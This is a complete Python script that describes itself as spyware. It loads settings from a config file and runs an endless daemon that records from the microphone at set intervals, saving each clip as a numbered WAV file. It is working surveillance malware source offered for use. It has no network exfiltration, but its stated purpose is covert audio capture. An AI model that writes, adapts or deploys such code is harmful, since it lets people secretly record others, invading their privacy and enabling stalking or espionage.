#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file implement a SpyWare to record from microphone. """

###################
#    This file implement a SpyWare to record from microphone.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

__all__ = ["main", "Daemon", "config_load"]

from os import path, makedirs, environ
from configparser import ConfigParser
from pyaudio import PyAudio, paInt16
from time import sleep
from glob import glob
from enum import Enum
from sys import argv
import wave


def config_load() -> None:

    """ This function load the config file. """

    global Constantes

    CONFIG = ConfigParser()
    env_conf_file = environ.get("audioSpy.conf")

    if len(argv) == 2:
        CONFIG.read(argv[1])
    elif env_conf_file:
        CONFIG.read(env_conf_file)
    else:
        CONFIG.read(path.join(path.dirname(__file__), "audioSpy.conf"))


    class Constantes(Enum):

        save_filename: str = CONFIG["SAVE"]["filename"]
        save_dirname: str = CONFIG["SAVE"]["dirname"]
        timeBetweenRecord: float = CONFIG.getfloat("TIME", "recordSleep")
        recordTime: float = CONFIG.getfloat("TIME", "recordTime")

        CHUNK = 1024
        FORMAT = paInt16
        CHANNELS = 2
        RATE = 44100


class Daemon:

    """ This class implement a loop to record from microphone. """

    def __init__(self):
        self.time = Constantes.timeBetweenRecord.value
        self.run = True
        self.path = path.join(
            Constantes.save_dirname.value, Constantes.save_filename.value
        )
        self.increment = len(glob(self.path))

    def run_for_ever(self) -> None:

        """ This function record from microphone and sleep for ever. """

        makedirs(Constantes.save_dirname.value, exist_ok=True)

        while self.run:
            save_record(
                self.path.replace("*", str(self.increment)), Constantes.recordTime.value
            )
            self.increment += 1

            if self.run:
                sleep(self.time)


def main() -> None:
    config_load()

    daemon = Daemon()
    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False


def save_record(filename: str, time: int) -> None:

    """ This function record from microphone and save in wave file. """

    p = PyAudio()

    stream = p.open(
        format=Constantes.FORMAT.value,
        channels=Constantes.CHANNELS.value,
        rate=Constantes.RATE.value,
        input=True,
        frames_per_buffer=Constantes.CHUNK.value,
    )

    frames = []

    for i in range(0, int(Constantes.RATE.value / Constantes.CHUNK.value * time)):
        data = stream.read(Constantes.CHUNK.value)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(filename, "wb")
    wf.setnchannels(Constantes.CHANNELS.value)
    wf.setsampwidth(p.get_sample_size(Constantes.FORMAT.value))
    wf.setframerate(Constantes.RATE.value)
    wf.writeframes(b"".join(frames))
    wf.close()


if __name__ == "__main__":
    main()
